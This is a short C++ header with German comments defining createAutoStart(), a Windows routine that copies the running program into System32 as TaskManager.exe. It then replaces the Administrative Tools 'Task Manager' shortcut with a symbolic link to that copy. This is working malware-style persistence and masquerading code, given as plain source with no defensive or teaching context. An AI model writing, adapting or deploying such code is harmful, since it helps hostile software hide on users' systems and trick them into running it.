#pragma once
#include <Windows.h>
#include <iostream>

using namespace std;

void createAutoStart() {
	const unsigned int iMaxPathLength = 256;
	char fileName[iMaxPathLength] = { 0 }; //filename (for example in downloads)
	//Full path vom Programm bekommen
	GetModuleFileName(NULL, fileName, iMaxPathLength);

	//File nach System32 kopieren, und zu TaskManager umbenennen
	LPCTSTR lpNewFileName = "C:\\Windows\\System32\\TaskManager.exe";
	LPCTSTR copyFileName = (LPCTSTR)fileName;

	BOOL bSuccess = CopyFile(copyFileName, lpNewFileName, FALSE);

	if (!bSuccess) {
		cout << "Error while copying file to system32";
	}
	else {
		cout << "Copied file to system32";
	}

	LPCTSTR targetPath = "C:\\Windows\\System32\\TaskManager.exe";
	LPCTSTR symlinkPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Administrative Tools\\Task Manager.lnk";

	if (CreateSymbolicLink(symlinkPath, targetPath, 0) == 0) {
		std::cout << "Error creating symbolic link: " << GetLastError() << std::endl;
	}
	else {
		std::cout << "Symbolic link created successfully" << std::endl;
	}
}